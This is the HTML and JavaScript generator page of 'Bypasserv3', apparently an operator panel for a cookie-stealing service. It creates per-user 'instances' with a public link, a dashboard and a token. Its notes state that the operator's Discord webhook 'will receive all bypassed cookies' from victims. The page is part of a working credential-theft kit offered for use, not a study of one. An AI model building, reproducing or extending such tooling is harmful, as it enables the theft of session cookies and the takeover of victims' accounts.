<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generator - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-light: #a78bfa;
            --dark: #0f172a;
            --darker: #0a0e1a;
            --light: #f8fafc;
            --gray: #94a3b8;
            --success: #10b981;
            --error: #ef4444;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --glass: rgba(30, 41, 59, 0.5);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--darker);
            color: var(--light);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
            background-attachment: fixed;
            padding: 20px;
        }

        .generator-container {
            width: 100%;
            max-width: 500px;
        }

        .generator-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 40px;
            border: 1px solid var(--glass-border);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .generator-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .generator-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 28px;
        }

        .generator-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .generator-subtitle {
            color: var(--gray);
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
            color: var(--gray);
        }

        .input-wrapper {
            position: relative;
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray);
            font-size: 16px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px 12px 44px;
            background: rgba(30, 41, 59, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            color: var(--light);
            font-family: 'Poppins', sans-serif;
            font-size: 14px;
            transition: var(--transition);
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
        }

        .form-help {
            font-size: 12px;
            color: var(--gray);
            margin-top: 6px;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(139, 92, 246, 0.4);
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .footer-text {
            text-align: center;
            margin-top: 20px;
            font-size: 13px;
            color: var(--gray);
        }

        .footer-text a {
            color: var(--primary-light);
            text-decoration: none;
            font-weight: 500;
        }

        .footer-text a:hover {
            color: var(--primary);
        }

        .info-box {
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            color: var(--gray);
        }

        .info-box strong {
            color: var(--light);
        }
    </style>
</head>
<body>
    <div class="generator-container">
        <div class="generator-card">
            <div class="generator-header">
                <div class="generator-icon">
                    <i class="fas fa-magic"></i>
                </div>
                <h1 class="generator-title">Create Instance</h1>
                <p class="generator-subtitle">Generate your bypass instance in seconds</p>
            </div>

            <div class="info-box">
                <strong>ℹ️ Note:</strong> Your Discord webhook will receive all bypassed cookies from your instance.
            </div>

            <form id="generatorForm">
                <div class="form-group">
                    <label class="form-label">Directory Name</label>
                    <div class="input-wrapper">
                        <i class="fas fa-folder input-icon"></i>
                        <input 
                            type="text" 
                            class="form-input" 
                            id="directory"
                            placeholder="my-bypass-instance"
                            pattern="[A-Za-z0-9_-]{3,32}"
                            required
                            autocomplete="off"
                        >
                    </div>
                    <div class="form-help">3-32 characters (letters, numbers, hyphens, underscores only)</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Master Webhook URL</label>
                    <div class="input-wrapper">
                        <i class="fas fa-link input-icon"></i>
                        <input 
                            type="url" 
                            class="form-input" 
                            id="masterWebhook"
                            placeholder="https://discord.com/api/webhooks/..."
                            required
                            autocomplete="off"
                        >
                    </div>
                    <div class="form-help">Your Discord webhook URL (receives all cookies)</div>
                </div>

                <div class="form-group">
                    <label class="form-label">User Webhook URL (Optional)</label>
                    <div class="input-wrapper">
                        <i class="fas fa-link input-icon"></i>
                        <input 
                            type="url" 
                            class="form-input" 
                            id="userWebhook"
                            placeholder="https://discord.com/api/webhooks/... (optional)"
                            autocomplete="off"
                        >
                    </div>
                    <div class="form-help">Secondary webhook (defaults to master webhook if empty)</div>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">
                    <i class="fas fa-rocket"></i>
                    <span>Generate Instance</span>
                </button>
            </form>

            <div class="footer-text">
                Already have an instance? <a href="../dashboard/sign-in.php">Sign in</a>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('generatorForm');
        const submitBtn = document.getElementById('submitBtn');
        const directoryInput = document.getElementById('directory');
        const masterWebhookInput = document.getElementById('masterWebhook');
        const userWebhookInput = document.getElementById('userWebhook');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const directory = directoryInput.value.trim();
            const masterWebhook = masterWebhookInput.value.trim();
            const userWebhook = userWebhookInput.value.trim() || masterWebhook;

            // Validate directory format
            if (!/^[A-Za-z0-9_-]{3,32}$/.test(directory)) {
                Swal.fire({
                    title: 'Invalid Directory',
                    text: 'Directory must be 3-32 characters (letters, numbers, hyphens, underscores only)',
                    icon: 'error',
                    background: '#0f172a',
                    color: '#f8fafc',
                    confirmButtonColor: '#ef4444'
                });
                return;
            }

            // Disable button
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Creating...</span>';

            try {
                const response = await fetch('create.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        directory: directory,
                        masterWebhook: masterWebhook,
                        userWebhook: userWebhook
                    })
                });

                const data = await response.json();

                if (data.success) {
                    await Swal.fire({
                        title: 'Success!',
                        html: `
                            <div style="text-align: left; padding: 20px;">
                                <p style="margin-bottom: 15px; color: #94a3b8;">Your instance has been created!</p>
                                
                                <div style="margin-bottom: 15px;">
                                    <strong style="color: #a78bfa;">🔗 Public Link:</strong><br>
                                    <code style="background: rgba(139, 92, 246, 0.1); padding: 8px; border-radius: 4px; display: block; margin-top: 5px; word-break: break-all;">${data.publicUrl}</code>
                                </div>
                                
                                <div style="margin-bottom: 15px;">
                                    <strong style="color: #a78bfa;">📊 Dashboard:</strong><br>
                                    <code style="background: rgba(139, 92, 246, 0.1); padding: 8px; border-radius: 4px; display: block; margin-top: 5px; word-break: break-all;">${data.dashboardUrl}</code>
                                </div>
                                
                                <div style="margin-bottom: 15px;">
                                    <strong style="color: #a78bfa;">🔑 Token:</strong><br>
                                    <code style="background: rgba(139, 92, 246, 0.1); padding: 8px; border-radius: 4px; display: block; margin-top: 5px; word-break: break-all;">${data.token}</code>
                                </div>
                                
                                <p style="color: #10b981; margin-top: 15px;">✅ Check your Discord webhook for details!</p>
                            </div>
                        `,
                        icon: 'success',
                        background: '#0f172a',
                        color: '#f8fafc',
                        confirmButtonColor: '#8b5cf6',
                        confirmButtonText: 'Go to Dashboard',
                        width: '600px'
                    });

                    // Redirect to dashboard
                    window.location.href = data.dashboardUrl;
                } else {
                    Swal.fire({
                        title: 'Error',
                        text: data.error || 'Failed to create instance',
                        icon: 'error',
                        background: '#0f172a',
                        color: '#f8fafc',
                        confirmButtonColor: '#ef4444'
                    });

                    // Re-enable button
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = '<i class="fas fa-rocket"></i><span>Generate Instance</span>';
                }
            } catch (error) {
                console.error('Error:', error);
                Swal.fire({
                    title: 'Error',
                    text: 'An error occurred. Please try again.',
                    icon: 'error',
                    background: '#0f172a',
                    color: '#f8fafc',
                    confirmButtonColor: '#ef4444'
                });

                // Re-enable button
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-rocket"></i><span>Generate Instance</span>';
            }
        });

        // Auto-focus directory input
        directoryInput.focus();
    </script>
</body>
</html>
